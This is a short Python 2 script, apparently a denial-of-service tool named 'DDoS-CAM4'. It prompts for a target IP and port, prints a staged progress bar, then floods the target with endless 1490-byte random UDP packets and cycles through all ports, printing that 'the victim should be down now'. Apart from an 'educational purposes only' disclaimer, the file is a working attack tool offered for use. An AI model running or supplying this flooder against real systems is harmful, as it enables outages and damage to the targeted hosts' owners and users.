import sys
import os
import time
import socket
import random
#This is where the magic starts using the power of python
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
#Install Figlet
os.system("clear")
os.system("apt-get install -y figlet")
os.system("figlet DDoS-CAM4")
print
print "Author   : RIZ4D"
print "Github   : https://github.com/riz4d"
print "Instagram : https://www.instagram.com/rizad__x96/"
print "Twitter : https://twitter.com/rizad_x96"
print
print "This tool is written for educational purposes only - helping the defensive team look into how such attacks take place."
print "BHEH Is not responsivle for misusing it and must have an NDA signed to perform such attacks"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s - The Victim should be down now..."%(sent,ip,port)
     if port == 65534:
       port = 1
